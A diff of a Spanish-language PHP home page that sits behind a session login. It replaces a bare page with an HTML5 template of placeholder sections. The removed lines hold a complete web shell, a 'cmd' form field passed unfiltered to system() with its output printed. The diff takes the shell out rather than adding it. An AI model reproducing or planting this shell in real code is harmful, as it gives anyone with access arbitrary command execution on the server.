@@ -7,23 +7,32 @@ if (!isset($_SESSION['usuario'])) {
 }
 
 $usuario = $_SESSION['usuario'];
-echo "<br>¡Bienvenido, $usuario!<br><br>";
+echo "<br>¡Bienvenid@, $usuario!<br><br>";
 
 ?>
-<html>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inicio</title>
+    <link rel='stylesheet' href='styles/inicio##estilo##.css'>
+</head>
 <body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-<input type="TEXT" name="cmd" id="cmd" size="80">
-<input type="SUBMIT" value="Execute">
-</form>
-<pre>
-<?php
-    if(isset($_GET['cmd']))
-    {
-        system($_GET['cmd']);
-    }
-?>
-</pre>
+    <header id="encabezado">
+        <!--encabezado-->
+    </header>
+
+    <nav id="menu">
+        <!--menu-->
+    </nav>
+
+    <main id="contenido">
+        <!--contenido-->
+    </main>
+
+    <footer id="pie-pagina">
+        <!--pie-->
+    </footer>
 </body>
-<script>document.getElementById("cmd").focus();</script>
 </html>
